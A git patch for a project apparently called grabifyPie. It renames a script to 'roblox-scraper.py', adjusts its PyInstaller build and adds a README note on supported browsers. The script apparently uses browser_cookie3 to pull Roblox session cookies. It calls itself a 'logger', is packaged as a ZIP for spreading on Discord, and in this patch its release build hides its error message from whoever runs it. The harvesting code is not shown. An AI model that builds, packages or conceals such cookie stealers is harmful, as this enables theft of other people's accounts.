@@ -1,0 +1,68 @@
+From 98e93edb8d4a45590aef574a15857af2a3024715 Mon Sep 17 00:00:00 2001
+From: Kai Daniel Gonzalez <gkai70264@gmail.com>
+Date: Mon, 3 Oct 2022 16:59:02 -0400
+Subject: [PATCH 6/6] Changes & fixes
+
+---
+ README.md                             |  6 +++++-
+ build.ps1                             |  2 +-
+ roblox/{edge.py => roblox-scraper.py} | 12 ++++++------
+ 3 files changed, 12 insertions(+), 8 deletions(-)
+ rename roblox/{edge.py => roblox-scraper.py} (88%)
+
+diff --git a/README.md b/README.md
+index f91c1e8..ad6b677 100644
+--- a/README.md
++++ b/README.md
+@@ -16,4 +16,8 @@ This was tested on discord, you must add the `<DISTPATH>` to a ZIP file and dist
+ 
+ ## Build Instructions (Windows)
+ 
+-To build this program, you need to create an `output-bins` directory, then execute `.\build.ps1`.
+\ No newline at end of file
++To build this program, you need to create an `output-bins` directory, then execute `.\build.ps1`.
++
++## (NOTE) For ROBLOX Scraper
++
++It currently only supports `chrome/chromium`, `msedge`, and `opera`. Other browsers are currently not being looked at, but if you would like to request support for your browser, please [file an issue.](https://github.com/thekaigonzalez/grabifyPie/issues)
+\ No newline at end of file
+diff --git a/build.ps1 b/build.ps1
+index 354f871..ec445e2 100644
+--- a/build.ps1
++++ b/build.ps1
+@@ -1,5 +1,5 @@
+ # Pyinstaller command to build the pie.py to output-bins
+ pyinstaller --distpath=output-bins pie.py
+-pyinstaller --distpath=output-bins roblox/edge.py
++pyinstaller --distpath=output-bins roblox/roblox-scraper.py
+ 
+ Remove-Item pie.spec
+diff --git a/roblox/edge.py b/roblox/roblox-scraper.py
+similarity index 88%
+rename from roblox/edge.py
+rename to roblox/roblox-scraper.py
+index 2ea1511..2625b74 100644
+--- a/roblox/edge.py
++++ b/roblox/roblox-scraper.py
+@@ -53,12 +53,12 @@ def find_proper_browser():
+ 
+ def error_out():
+     # comment this out if it's a release
+-    print(
+-        colorama.Style.BRIGHT + colorama.Fore.RED +
+-        "!!! COULD NOT RUN LOGGER !!!\nfor programmers: this could be " +
+-        "because the host system does not run a supported browser. Or- no browser whatsoever. "
+-        + "Please refer to the browser_cookie3 module website for more info." +
+-        colorama.Style.RESET_ALL + colorama.Fore.RESET)
++    # print(
++    #     colorama.Style.BRIGHT + colorama.Fore.RED +
++    #     "!!! COULD NOT RUN LOGGER !!!\nfor programmers: this could be " +
++    #     "because the host system does not run a supported browser. Or- no browser whatsoever. "
++    #     + "Please refer to the browser_cookie3 module website for more info." +
++    #     colorama.Style.RESET_ALL + colorama.Fore.RESET)
+ 
+     print(
+         colorama.Fore.YELLOW +
+-- 
+2.37.3.windows.1
+
